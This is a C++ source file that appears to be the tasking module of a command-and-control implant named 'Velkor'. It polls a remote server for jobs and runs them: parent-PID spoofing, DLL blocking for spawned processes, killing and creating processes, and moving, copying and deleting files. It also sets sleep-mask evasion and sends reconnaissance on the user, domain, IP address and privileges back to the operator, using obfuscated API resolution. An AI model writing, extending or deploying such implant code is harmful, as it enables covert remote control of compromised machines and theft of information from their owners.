#include <Ground.h>                   

namespace Task {

    D_SEC( B ) VOID Dispatcher( VOID ) {
        VELKOR_INSTANCE

        PPACKAGE Package  = { 0 };
        PARSER   Parser   = { 0 };
        PVOID    DataBuff = NULL;
        SIZE_T   DataSize = 0;
        ULONG    TaskID   = 0;

        do {
            if ( !Velkor->Session.Connected ) return;

            SleepMain( SleepConf.SleepTime * 1000 );

            Package = Package::Create( CodeGetJob );

            Package::AddInt32( Package, Velkor->Session.AgentId );
            Package::Transmit( Package, &DataBuff, &DataSize    );

            if ( DataBuff && DataSize > 0 ) {
                Parser::New( &Parser, DataBuff, DataSize );

                do {
                    TaskID = Parser::GetInt32( &Parser );

                    if ( TaskID == CodeNoJob ) {
                        VkShow( "{JOB} No job to do\n" ); continue;
                    } 
                        
                    BOOL FoundCmd = FALSE;

                    for ( INT idx = 0; idx < TASK_LENGTH; idx++ ) {
                        if ( TaskMgmt[idx].ID == TaskID ) {
                            TaskMgmt[idx].TaskFunc( &Parser );
                            FoundCmd = TRUE; break;
                        }
                    }

                } while( Parser.Length > 4 );

                VkMem::Zero( DataBuff, DataSize );
                VkMem::Heap::Free( DataBuff, DataSize );

                DataBuff = NULL;
                Parser::Destroy ( &Parser );
            } else {
                VkShow( "{JOB} Connection Failed\n" );
            }

        } while( 1 );

        Velkor->Session.Connected = FALSE;
    }

    D_SEC( B ) VOID Process(
        _In_ PPARSER Parser
    ) {
        VELKOR_INSTANCE

        ULONG SubTaskID = Parser::GetInt32( Parser );
        
        switch ( SubTaskID ) {
        case SubProcessPpid: {
            VELKOR_PACKAGE = Package::Create( SubProcessPpid );

            PsCtx.Spawn.ParentPid = Parser::GetInt32( Parser );

            if ( !( PsCtx.Spawn.ParentHandle = VkProcess::Open( PROCESS_ALL_ACCESS, TRUE, PsCtx.Spawn.ParentPid ) ) ) {
                Package::TransmitError( NtLastError(), "Open handle to the target process" ); break;
            }

            Package::AddInt32( VELKOR_PACKAGE, PsCtx.Spawn.ParentPid );
            Package::Transmit( VELKOR_PACKAGE, NULL, 0 );

            break;
        }
        case SubProcessBlockDlls: {
            VELKOR_PACKAGE = Package::Create( SubProcessBlockDlls );

            PsCtx.Spawn.BlockDlls = Parser::GetBool( Parser );

            Package::AddBool(  VELKOR_PACKAGE, PsCtx.Spawn.BlockDlls );
            Package::Transmit( VELKOR_PACKAGE, NULL, 0 );

            break;
        }
        case SubProcessKill: {
            VELKOR_PACKAGE = Package::Create( SubProcessKill );

            ULONG  ProcessPid    = Parser::GetInt32( Parser );
            HANDLE ProcessHandle = NULL;
            BOOL   bSuccess      = FALSE;

            ProcessHandle = VkProcess::Open( PROCESS_TERMINATE, FALSE, ProcessPid );
            if ( !ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE ) {
                Package::TransmitError( NtLastError(), "Open process handle" ); break;
            }
            
            bSuccess = VkProcess::Kill( ProcessHandle, EXIT_SUCCESS );
            if ( !bSuccess ) {
                Package::TransmitError( NtLastError(), "Open process handle" ); break;
            }
        
            Package::AddBool(  VELKOR_PACKAGE, bSuccess );
            Package::Transmit( VELKOR_PACKAGE, NULL, 0 );

            break;
        }
        case SubProcessCreate: {
            VELKOR_PACKAGE = Package::Create( SubProcessCreate );
            
            PSTR ProcessPath = NULL;
            BOOL bSuccess    = FALSE;

            PROCESS_INFORMATION Pi = { 0 };

            ProcessPath = Parser::GetString( Parser, 0 );

            bSuccess = VkProcess::Create( 
                ProcessPath, TRUE, 0, NULL, &Pi, 
                PsCtx.Spawn.ParentPid, PsCtx.Spawn.BlockDlls 
            );
            if ( !bSuccess ) {
                Package::TransmitError( NtLastError(), "Process Creation" ); return;
            } 

            Package::AddInt32( VELKOR_PACKAGE, Pi.dwProcessId );
            Package::AddInt32( VELKOR_PACKAGE, Pi.dwThreadId  );

            Package::Transmit( VELKOR_PACKAGE, NULL, 0 ); 
            
            break;
        }
        }

        return;
    }

    D_SEC( B ) VOID Explorer(
        _In_ PPARSER Parser
    ) {
        VELKOR_INSTANCE

        VELKOR_PACKAGE = Package::Create( TaskExplorer );

        ULONG SubTaskID = Parser::GetInt32( Parser );

        switch ( SubTaskID ) {
        case SubExplorerPwd: {
            ULONG CharSizeRet = 0;

            CHAR CurPath[MAX_PATH] = { 0 };
            CharSizeRet = VkCall<ULONG>( XprKernel32, XPR( "GetCurrentDirectoryA" ), sizeof( CurPath ), CurPath );

            if ( !CharSizeRet ) {
                Package::TransmitError( NtLastError(), "Get Current Directory" ); break;
            }

            Package::AddString( VELKOR_PACKAGE, CurPath );
            Package::Transmit(  VELKOR_PACKAGE, NULL, 0 );

            break;
        }
        case SubExplorerMove: {
            BOOL bSuccess  = FALSE;
            PSTR ExistFile = Parser::GetString( Parser, 0 );
            PSTR NewFile   = Parser::GetString( Parser, 0 );

            bSuccess = VkCall<BOOL>( XprKernel32, XPR( "MoveFileA" ), ExistFile, NewFile );
            if ( !bSuccess ) {
                Package::TransmitError( NtLastError(), "Move file" ); break;
            }

            Package::AddBool(  VELKOR_PACKAGE, bSuccess );
            Package::Transmit( VELKOR_PACKAGE, NULL, 0  );

            break;
        }
        case SubExplorerCopy: {
            BOOL FailtExists = FALSE;
            BOOL bSuccess    = FALSE;
            PSTR ExistFile   = Parser::GetString( Parser, 0 );
            PSTR NewFile     = Parser::GetString( Parser, 0 );

            bSuccess = ( XprKernel32, XPR( "CopyFileA" ), ExistFile, NewFile, FailtExists );
            if ( !bSuccess ) {
                Package::TransmitError( NtLastError(), "Move file" ); break;
            }

            Package::AddBool(  VELKOR_PACKAGE, bSuccess );
            Package::Transmit( VELKOR_PACKAGE, NULL, 0  );

            break;
        }
        case SubExplorerDelete: {
            BOOL bSuccess = FALSE;
            PSTR FileName = Parser::GetString( Parser, 0 );

            bSuccess = VkCall<BOOL>( XprKernel32, XPR( "DeleteFileA" ), FileName );
            if ( !bSuccess ) {
                Package::TransmitError( NtLastError(), "Delete file" ); break;
            }

            Package::AddBool(  VELKOR_PACKAGE, bSuccess );
            Package::Transmit( VELKOR_PACKAGE, NULL, 0  );

            break;
        }
        case SubExplorerMakeDir: {
            BOOL bSuccess = FALSE;
            PSTR PathName = Parser::GetString( Parser, 0 );

            bSuccess = VkCall<BOOL>( XprKernel32, XPR( "CreateDirectoryA" ), PathName, 0 );
            if ( !bSuccess ) {
                Package::TransmitError( NtLastError(), "Make Directory" ); break;
            }

            Package::AddBool(  VELKOR_PACKAGE, bSuccess );
            Package::Transmit( VELKOR_PACKAGE, NULL, 0  );

            break;
        }
        }

        return;
    }

    D_SEC( B ) VOID SleepMask(
        _In_ PPARSER Parser
    ) {
        VELKOR_INSTANCE

        VELKOR_PACKAGE = Package::Create( TaskSleepMask );

        SleepConf.SleepMask = Parser::GetInt32( Parser );

        Package::AddInt32( VELKOR_PACKAGE, SleepConf.SleepMask );
        Package::Transmit( VELKOR_PACKAGE, NULL, 0 );

        return;
    }

    D_SEC( B ) VOID SleepTime(
        _In_ PPARSER Parser
    ) {
        VELKOR_INSTANCE

        VELKOR_PACKAGE = Package::Create( TaskSleepTime );

        SleepConf.SleepTime = Parser::GetInt32( Parser );

        Package::AddInt32( VELKOR_PACKAGE, SleepConf.SleepTime );
        Package::Transmit( VELKOR_PACKAGE, NULL, 0 );

        return;
    }

    D_SEC( B ) VOID GetInfo(
        _In_ PPARSER Parser
    ) {
        VELKOR_INSTANCE

        VELKOR_PACKAGE = Package::Create( TaskInfo );

        Package::AddInt32(   VELKOR_PACKAGE, Velkor->Session.SyscallMethod );
        
        Package::AddInt64( VELKOR_PACKAGE, U_64( Velkor->VelkorMemory.Full.Start ) );
        Package::AddInt64( VELKOR_PACKAGE, U_64( Velkor->VelkorMemory.Full.Length ) );
    
        Package::AddInt64( VELKOR_PACKAGE, U_64( Velkor->VelkorMemory.RxPage.Start ) );
        Package::AddInt64( VELKOR_PACKAGE, U_64( Velkor->VelkorMemory.RxPage.Length ) );

        Package::AddInt64( VELKOR_PACKAGE, U_64( Velkor->VelkorMemory.RwPage.Start ) );
        Package::AddInt64( VELKOR_PACKAGE, U_64( Velkor->VelkorMemory.RwPage.Length ) );

        Package::AddWString( VELKOR_PACKAGE, Velkor->Session.ProcessName );
        Package::AddWString( VELKOR_PACKAGE, Velkor->Session.ProcessFullPath );
        Package::AddInt32(   VELKOR_PACKAGE, Velkor->Session.ProcessId );
        Package::AddInt32(   VELKOR_PACKAGE, Velkor->Session.ThreadId );
        Package::AddInt32(   VELKOR_PACKAGE, Velkor->Session.ParentProcessId );
        Package::AddBool(    VELKOR_PACKAGE, Velkor->Session.Elevated );
        Package::AddInt32(   VELKOR_PACKAGE, Velkor->Session.ThreadId );
        Package::AddInt32(   VELKOR_PACKAGE, Velkor->Session.Protected );

        Package::AddWString( VELKOR_PACKAGE, W_PTR( Velkor->System.UserName.Start ) );
        Package::AddWString( VELKOR_PACKAGE, W_PTR( Velkor->System.ComputerName.Start ) );
        Package::AddWString( VELKOR_PACKAGE, W_PTR( Velkor->System.DomainName.Start ) );
        Package::AddWString( VELKOR_PACKAGE, W_PTR( Velkor->System.NetBios.Start ) );
        Package::AddWString( VELKOR_PACKAGE, W_PTR( Velkor->System.IpAddress.Start ) );
        Package::AddWString( VELKOR_PACKAGE, W_PTR( Velkor->System.ProcessorName.Start ) );
        Package::AddWString( VELKOR_PACKAGE, W_PTR( Velkor->System.IpAddress.Start ) );
        Package::AddInt32( VELKOR_PACKAGE, Velkor->System.NumberOfProcessors );
        Package::AddInt32( VELKOR_PACKAGE, Velkor->System.TotalRam );
        Package::AddInt32( VELKOR_PACKAGE, Velkor->System.AvalRam );
        Package::AddInt32( VELKOR_PACKAGE, Velkor->System.UsedRam );
        Package::AddInt32( VELKOR_PACKAGE, Velkor->System.UsagePercent );

        Package::Transmit( VELKOR_PACKAGE, NULL, 0 );

        return;
    }
}
